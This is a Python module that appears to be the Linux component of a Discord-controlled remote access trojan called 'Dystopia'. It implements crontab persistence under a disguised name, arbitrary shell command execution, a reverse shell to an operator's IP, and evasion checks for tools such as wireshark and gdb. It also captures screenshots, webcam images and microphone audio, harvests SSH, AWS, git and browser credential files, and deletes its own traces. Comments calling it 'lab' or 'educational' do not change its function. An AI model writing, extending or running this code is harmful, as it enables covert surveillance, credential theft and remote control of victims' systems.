# -*- coding: utf-8 -*-
"""Linux operator helpers for Dystopia Discord agents.

Designed for real Linux targets (workstations + servers/VPS).
Does not treat virtualization as a hard block — most real hosts are VMs.
"""

from __future__ import annotations

import os
import random
import shutil
import socket
import subprocess as sp
import sys
import tempfile
import threading
from pathlib import Path
from urllib.request import Request, urlopen

import psutil
import requests

# Quiet urllib3 when verify=False is used for lab file staging.
try:
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


def _home() -> Path:
    return Path.home()


def config_dir() -> Path:
    path = _home() / ".config" / "dystopia"
    path.mkdir(parents=True, exist_ok=True)
    (path / "uploads").mkdir(parents=True, exist_ok=True)
    return path


def tmp_path(name: str) -> str:
    return str(Path(tempfile.gettempdir()) / name)


def getIP() -> str:
    try:
        return urlopen(Request("https://ipv4.myip.wtf/text"), timeout=8).read().decode().strip()
    except Exception:
        try:
            return requests.get("https://api.ipify.org", timeout=8).text.strip()
        except Exception:
            return "None"


def getBits() -> str:
    try:
        return platform_architecture()
    except Exception:
        return "None"


def platform_architecture() -> str:
    import platform as _platform

    return _platform.architecture()[0]


def getUsername() -> str:
    try:
        return os.getlogin()
    except Exception:
        return os.environ.get("USER") or os.environ.get("LOGNAME") or "None"


def getOS() -> str:
    try:
        import platform as _platform

        return _platform.platform()
    except Exception:
        return "None"


def getCPU() -> str:
    try:
        import platform as _platform

        return _platform.processor() or _platform.machine()
    except Exception:
        return "None"


def getHostname() -> str:
    try:
        return socket.gethostname()
    except Exception:
        return "None"


def isAdmin() -> bool:
    try:
        return os.geteuid() == 0
    except Exception:
        return False


def isVM() -> bool:
    """Informational only — Linux agents must run on VPS/QEMU/KVM."""
    markers = ("vmware", "virtualbox", "kvm", "qemu", "xen", "microsoft", "amazon", "google")
    try:
        product = Path("/sys/class/dmi/id/product_name").read_text(errors="ignore").lower()
        if any(m in product for m in markers):
            return True
    except Exception:
        pass
    try:
        vendor = Path("/sys/class/dmi/id/sys_vendor").read_text(errors="ignore").lower()
        if any(m in vendor for m in markers):
            return True
    except Exception:
        pass
    return False


def createConfig() -> bool:
    marker = config_dir() / ".initialized"
    if marker.exists():
        return False
    marker.write_text("1", encoding="utf-8")
    return True


def id() -> int:
    path = config_dir() / "ID"
    if path.exists():
        raw = path.read_text(encoding="utf-8").strip()
        if raw.isdigit():
            return int(raw)
    value = random.randint(1, 10000)
    path.write_text(str(value), encoding="utf-8")
    return value


def cd(path: str):
    try:
        os.chdir(path)
        return True
    except Exception as e:
        return e


def process() -> str:
    lines = ["PID\tUSER\tNAME\tCPU%\tMEM%"]
    for p in psutil.process_iter(["pid", "username", "name", "cpu_percent", "memory_percent"]):
        try:
            info = p.info
            lines.append(
                f"{info.get('pid')}\t{info.get('username')}\t{info.get('name')}\t"
                f"{info.get('cpu_percent')}\t{round(info.get('memory_percent') or 0, 1)}"
            )
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return "\n".join(lines)


def upload(url: str, name: str):
    dest = config_dir() / "uploads" / name
    try:
        r = requests.get(url, allow_redirects=True, verify=False, timeout=60)
        r.raise_for_status()
        dest.write_bytes(r.content)
        return True
    except Exception as e:
        return e


def screenshot():
    """Best-effort GUI screenshot. Headless servers return False."""
    path = tmp_path("dystopia-screen.png")
    try:
        import mss
        from PIL import Image

        with mss.mss() as sct:
            shot = sct.grab(sct.monitors[0])
            Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX").save(path)
        return path
    except Exception:
        pass
    for cmd in (
        ["scrot", "-o", path],
        ["gnome-screenshot", "-f", path],
        ["import", "-window", "root", path],
    ):
        try:
            sp.run(cmd, check=True, stdout=sp.DEVNULL, stderr=sp.DEVNULL, timeout=15)
            if Path(path).exists():
                return path
        except Exception:
            continue
    return False


def persistent():
    """User-level persistence: copy + crontab @reboot (no root required)."""
    try:
        install_dir = _home() / ".local" / "share" / ".sync"
        install_dir.mkdir(parents=True, exist_ok=True)
        dest = install_dir / "update-service"
        src = Path(sys.executable if getattr(sys, "frozen", False) else sys.argv[0]).resolve()
        if not dest.exists() or dest.stat().st_mtime < src.stat().st_mtime:
            shutil.copy2(src, dest)
            dest.chmod(0o755)

        if getattr(sys, "frozen", False):
            run_cmd = str(dest)
        else:
            run_cmd = f"{shutil.which('python3') or sys.executable} {dest}"

        # Keep payload next to launcher when running as .py
        if not getattr(sys, "frozen", False):
            shutil.copy2(src, dest)

        cron_line = f"@reboot {run_cmd} >/dev/null 2>&1"
        existing = sp.run(["crontab", "-l"], capture_output=True, text=True)
        current = existing.stdout if existing.returncode == 0 else ""
        if cron_line in current:
            return "already-enabled"
        new_cron = current.rstrip() + ("\n" if current.strip() else "") + cron_line + "\n"
        proc = sp.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
        if proc.returncode != 0:
            return proc.stderr or "crontab-failed"
        return True
    except Exception as e:
        return e


def cmd(command: str) -> str:
    try:
        result = sp.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=120,
        )
        out = (result.stdout or "") + (result.stderr or "")
        return out if out.strip() else f"(exit {result.returncode})"
    except Exception as e:
        return str(e)


def selfdestruct():
    try:
        install_dir = _home() / ".local" / "share" / ".sync"
        cfg = config_dir()
        if install_dir.exists():
            shutil.rmtree(install_dir, ignore_errors=True)
        if cfg.exists():
            shutil.rmtree(cfg, ignore_errors=True)
        existing = sp.run(["crontab", "-l"], capture_output=True, text=True)
        if existing.returncode == 0 and existing.stdout:
            lines = [ln for ln in existing.stdout.splitlines() if "update-service" not in ln]
            sp.run(["crontab", "-"], input="\n".join(lines) + ("\n" if lines else ""), text=True)
        return True
    except Exception as e:
        return e


def location():
    try:
        response = requests.get("https://json.ipv4.myip.wtf", timeout=8)
        response.raise_for_status()
        return response
    except Exception:
        return False


def revshell(ip: str, port: int) -> bool:
    def _connect(host: str, p: int):
        try:
            # Pure Python reverse shell — no external nc binary required.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(p)))
            for fd in (0, 1, 2):
                try:
                    os.dup2(s.fileno(), fd)
                except Exception:
                    pass
            sp.call(["/bin/bash", "-i"])
        except Exception:
            pass

    threading.Thread(target=_connect, args=(ip, port), daemon=True).start()
    return True


def killproc(pid: int):
    try:
        p = psutil.Process(int(pid))
        p.kill()
        return True
    except Exception as e:
        return e


def light_evasion_ok() -> bool:
    """Optional analysis-tool check. Does NOT block VMs/cloud."""
    bad = {
        "wireshark",
        "tshark",
        "tcpdump",
        "strace",
        "ltrace",
        "gdb",
        "radare2",
        "x64dbg",
        "procmon",
        "fiddler",
        "burpsuite",
    }
    try:
        running = { (p.name() or "").lower() for p in psutil.process_iter(["name"]) }
        if running & bad:
            return False
    except Exception:
        pass
    return True


def webshot():
    """Best-effort webcam capture via OpenCV. Returns path or False."""
    path = tmp_path("dystopia-webshot.png")
    try:
        import cv2

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            cap.release()
            return False
        ok, frame = cap.read()
        cap.release()
        if not ok or frame is None:
            return False
        if not cv2.imwrite(path, frame):
            return False
        return path
    except Exception:
        return False


def creds():
    """Best-effort readable lab paths under home (no browser decrypt).

    Returns path to a short report file, or False with no readable hits.
    """
    home = _home()
    candidates = [
        home / ".ssh" / "id_rsa",
        home / ".ssh" / "id_ed25519",
        home / ".ssh" / "authorized_keys",
        home / ".ssh" / "config",
        home / ".aws" / "credentials",
        home / ".aws" / "config",
        home / ".netrc",
        home / ".git-credentials",
        home / ".docker" / "config.json",
        home / ".config" / "gh" / "hosts.yml",
        home / ".config" / "google-chrome" / "Default" / "Login Data",
        home / ".config" / "chromium" / "Default" / "Login Data",
        home / ".mozilla" / "firefox",
        home / ".local" / "share" / "keyrings",
    ]
    lines = [
        "# Linux creds — educational best-effort inventory (readable paths only)",
        "# Full Chrome/Firefox secret decrypt is Windows-only / limited on this agent.",
        f"# home={home}",
        "",
    ]
    found = 0
    for p in candidates:
        try:
            if not p.exists():
                continue
            if p.is_dir():
                try:
                    kids = sorted(x.name for x in p.iterdir())[:30]
                except Exception as e:
                    lines.append(f"DIR  {p}  [list-error: {e}]")
                    found += 1
                    continue
                lines.append(f"DIR  {p}  entries={len(kids)} sample={kids[:10]}")
                found += 1
            else:
                mode = oct(p.stat().st_mode & 0o777)
                size = p.stat().st_size
                readable = os.access(p, os.R_OK)
                note = "readable" if readable else "exists-not-readable"
                lines.append(f"FILE {p}  mode={mode} size={size} {note}")
                found += 1
                # Small text configs only — never dump private key bodies wholesale in chat labs
                if readable and size <= 8192 and p.suffix in {".yml", ".yaml", ".json", ".netrc", ""} and p.name in {
                    "config",
                    "credentials",
                    "hosts.yml",
                    "config.json",
                    ".netrc",
                    "authorized_keys",
                }:
                    try:
                        body = p.read_text(encoding="utf-8", errors="replace")
                        # redact obvious private key blocks
                        if "PRIVATE KEY" in body:
                            lines.append("  [content redacted: private key material]")
                        else:
                            for ln in body.splitlines()[:40]:
                                lines.append(f"  | {ln}")
                    except Exception as e:
                        lines.append(f"  [read-error: {e}]")
        except Exception as e:
            lines.append(f"ERR  {p}: {e}")
            found += 1

    if found == 0:
        lines.append("(no common credential paths found / readable)")
    out = Path(tmp_path("dystopia-creds.txt"))
    out.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return str(out)


def wallpaper(path_or_url: str):
    """Try gsettings (GNOME) or feh. Returns True, False, or 'unsupported'."""
    local = Path(tmp_path("dystopia-wallpaper.bin"))
    try:
        src = path_or_url.strip()
        if src.startswith("http://") or src.startswith("https://"):
            r = requests.get(src, allow_redirects=True, verify=False, timeout=60)
            r.raise_for_status()
            local.write_bytes(r.content)
            img = str(local)
        else:
            img = str(Path(src).expanduser().resolve())
            if not Path(img).is_file():
                return False

        # GNOME
        try:
            uri = Path(img).resolve().as_uri()
            proc = sp.run(
                ["gsettings", "set", "org.gnome.desktop.background", "picture-uri", uri],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if proc.returncode == 0:
                sp.run(
                    ["gsettings", "set", "org.gnome.desktop.background", "picture-uri-dark", uri],
                    capture_output=True,
                    text=True,
                    timeout=10,
                )
                return True
        except Exception:
            pass

        # feh (X11)
        if shutil.which("feh"):
            proc = sp.run(["feh", "--bg-fill", img], capture_output=True, text=True, timeout=15)
            if proc.returncode == 0:
                return True

        return "unsupported"
    except Exception:
        return False
    finally:
        try:
            if local.exists() and (path_or_url.startswith("http://") or path_or_url.startswith("https://")):
                # keep until next overwrite; optional cleanup
                pass
        except Exception:
            pass


def recordmic(seconds: int):
    """Record mic via arecord to WAV. Returns path or False."""
    try:
        secs = max(1, min(int(seconds), 120))
    except Exception:
        return False
    path = tmp_path("dystopia-mic.wav")
    arecord = shutil.which("arecord")
    if not arecord:
        return False
    try:
        proc = sp.run(
            [arecord, "-d", str(secs), "-f", "cd", "-t", "wav", path],
            capture_output=True,
            text=True,
            timeout=secs + 15,
        )
        if proc.returncode == 0 and Path(path).exists() and Path(path).stat().st_size > 44:
            return path
        return False
    except Exception:
        return False

